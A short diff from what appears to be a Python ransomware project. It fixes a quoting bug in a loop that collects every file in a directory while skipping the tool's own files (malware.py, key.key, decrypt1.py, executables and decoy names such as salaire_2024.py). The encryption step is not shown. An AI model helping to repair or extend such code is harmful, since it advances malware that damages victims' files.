@@ -156,7 +156,7 @@ fenetre.mainloop()
 
 allfiles =[]
 for file in os.listdir():
-    if file == "malware.py" or file == "key.key" or file == "decrypt1.py" or file == "malware.exe" or file =="decrypt1.exe" or file == "salaire_2024.py" or file == "rick.mp3" or file == "decrypt1.py" or file == wire_dolphin.exe:
+    if file == "malware.py" or file == "key.key" or file == "decrypt1.py" or file == "malware.exe" or file =="decrypt1.exe" or file == "salaire_2024.py" or file == "rick.mp3" or file == "decrypt1.py" or file == "wire_dolphin.exe":
         continue
     if os.path.isfile(file):
         allfiles.append(file)
